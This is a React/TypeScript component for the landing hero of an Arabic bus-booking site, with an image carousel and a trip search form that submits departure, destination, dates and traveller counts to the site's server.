import { BorderBeam } from "@/components/ui/border-beam";
import Label from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import ShinyButton from "@/components/ui/shiny-button";
import { useEffect, useRef, useState } from "react";
import TravellersCountInput from "./TravellersCountInput";
import { cn } from "@/lib/utils";
import { isAdminError } from "@/real-time/context/signals";
import { useNavigate } from "react-router-dom";
import { addDays, format } from "date-fns";
import { FieldValues, useForm } from "react-hook-form";
import { flyProps } from "@/types/fly.types";
import { DateInput } from "@/components/DateInput/DateInput";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { destinations } from "@/data/custom-data";
import {
  Carousel,
  CarouselContent,
  CarouselItem,
} from "@/components/ui/carousel";
import Autoplay from "embla-carousel-autoplay";

const tabs = ["ذهاب", "ذهاب و إياب"];

const initFormData = {
  to: "",
  from: "",
  adult: 1,
  child: 0,
  baby: 0,
  "date-from": format(new Date(), "yyyy-MM-dd"),
  "date-to": format(addDays(new Date(), 3), "yyyy-MM-dd"),
  "code-comerce": "",
};
const heroImages = [
  "/assets/images/hero.jpg",
  "/assets/images/hero2.jpg",
  "/assets/images/hero3.jpeg",
];

const HeroSection = () => {
  useEffect(() => {
    setCurrentPage("الرئيسية");
  }, []);

  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState<number>(0);

  const {
    register,
    handleSubmit,
    setValue,
    watch,
    formState: { errors },
  } = useForm({
    defaultValues: initFormData,
  });

  const onSubmit = (data: FieldValues) => {
    data.activeTab = activeTab;
    activeTab !== 0 && delete data["date-to"];

    sendDataToServer({
      current: "الرئيسية",
      data: {
        الوجهة: data.to,
        "مكان بدء الرحلة": data.from,
        "عدد البالغين": data.adult,
        "عدد الاطفال": data.child,
        "الرضع الطفولة": data.baby,
        التاريخ: `${data["date-from"]} إلي ${data["date-to"]}`,
      },
      nextPage: "trip-confirm",
      waitingForAdminResponse: false,
      navigate,
      state: data,
    });
  };

  const plugin = useRef(Autoplay({ delay: 2000, stopOnInteraction: true }));

  return (
    <section className="min-h-[calc(100svh-78px)] lg:min-h-[calc(100svh-72px)] relative pb-10 lg:pb-20">
      <Carousel
        className="size-full select-none"
        opts={{
          direction: "rtl",
          loop: true,
        }}
        // @ts-ignore
        plugins={[plugin.current!]}
      >
        <CarouselContent className="h-[50dvh] lg:h-[70dvh]">
          {heroImages.map((img) => (
            <CarouselItem key={img} className="relative overflow-hidden">
              <img
                id="hero-image"
                src={img}
                alt={`${img} image`}
                className="pl-4 inset-0 absolute object-fill w-full h-full"
              />
            </CarouselItem>
          ))}
        </CarouselContent>
      </Carousel>

      <div className="-translate-y-44">
        <h1 className="mb-6 bg-main text-white text-center lg:text-4xl font-bold w-fit mx-auto px-4 rounded-sm">
          الحجز الإلكتروني المباشر - خدمة الحافلات بين "المدن"
        </h1>

        <div className="max-w-[90dvw] container mx-auto rounded-2xl bg-white/95 relative overflow-hidden p-4">
          <BorderBeam />

          <form className="py-6 px-4" onSubmit={handleSubmit(onSubmit)}>
            <div className="flex gap-4 mb-4">
              {tabs.map((tab, index) => (
                <button
                  key={index}
                  className={`relative cursor-pointer text-sm md:text-base px-2 pb-1 rounded-md underline-offset-4 hover:underline ${
                    activeTab === index
                      ? "bg-main text-white underline animate-pulse"
                      : ""
                  }`}
                  onClick={() => setActiveTab(index)}
                  type="button"
                >
                  {tab}
                </button>
              ))}
            </div>

            <div className="grid items-end grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-1 relative">
                <FlyInputs
                  label="-- من --"
                  id="from"
                  sels={destinations}
                  placeholder="المغادرة"
                  register={register}
                  errors={errors}
                  options={{
                    required: {
                      value: true,
                      message: "يجب تحديد مكان المغادرة",
                    },
                  }}
                  setValue={setValue}
                />
              </div>
              <div className="lg:col-span-1 relative">
                <FlyInputs
                  label="-- إلي --"
                  id="to"
                  sels={destinations}
                  placeholder="الوجهة"
                  register={register}
                  errors={errors}
                  options={{
                    required: {
                      value: true,
                      message: "يجب تحديد الوجهة",
                    },
                  }}
                  setValue={setValue}
                />
              </div>

              {activeTab === 0 ? (
                <div className="lg:col-span-1 relative">
                  <DateInput
                    label="التاريخ"
                    id="date-from"
                    register={register}
                    setValue={setValue}
                    errors={errors}
                  />
                </div>
              ) : (
                <>
                  <div className="lg:col-span-1 relative">
                    <DateInput
                      label="تاريخ المغادرة"
                      id="date-from"
                      register={register}
                      setValue={setValue}
                      errors={errors}
                    />
                  </div>
                  <div className="lg:col-span-1 relative">
                    <DateInput
                      label="تاريخ العودة"
                      id="date-to"
                      register={register}
                      setValue={setValue}
                      errors={errors}
                      defaultValue={addDays(new Date(watch("date-from")), 3)}
                      disableDate={watch("date-from")}
                    />
                  </div>
                </>
              )}

              <div className="lg:col-span-1 relative pb-5">
                <TravellersCountInput
                  id="travellers-count"
                  register={register}
                  setValue={setValue}
                />
              </div>
            </div>

            <ShinyButton
              text="بحث"
              className="w-fit bg-gradient-to-b from-main to-main-dark text-white rounded-3xl font-semibold text-xl px-12 mx-auto mt-4 block py-2"
              type={"submit"}
            />
          </form>
        </div>
      </div>
    </section>
  );
};
export default HeroSection;

export const FlyInputs = ({
  label,
  id,
  register,
  setValue,
  errors,
  options = {},
  sels,
  Icon,
  placeholder,
}: flyProps) => {
  return (
    <>
      <Label label={label} id={id} className="text-main" />

      <Select onValueChange={(selected) => setValue && setValue(id, selected)}>
        <SelectTrigger
          className={cn(errors?.[id] ? "border-red-500" : "border-gray-300")}
          style={{ direction: "rtl" }}
        >
          {Icon && <Icon className="size-6 absolute right-4" />}

          <SelectValue
            placeholder={placeholder}
            id={id}
            {...register(id, options)}
          />
        </SelectTrigger>
        <SelectContent className="flex">
          {sels.map((sel: { name: string; code?: string; icon?: any }) => (
            <SelectItem
              key={sel.name}
              className="w-full"
              value={sel.name}
              style={{ direction: "rtl" }}
            >
              <div className="flex items-center">
                <p>{sel.name}</p>
                <p className="absolute left-12">{sel.code}</p>
              </div>
            </SelectItem>
          ))}
        </SelectContent>
      </Select>

      <p
        className={cn(
          "text-xs text-red-500 h-5 transition-opacity",
          errors?.[id] || isAdminError.value ? "opacity-100" : "opacity-0"
        )}
      >
        {(errors?.[id]?.message as string) || " هذا الحقل مطلوب"}
      </p>
    </>
  );
};
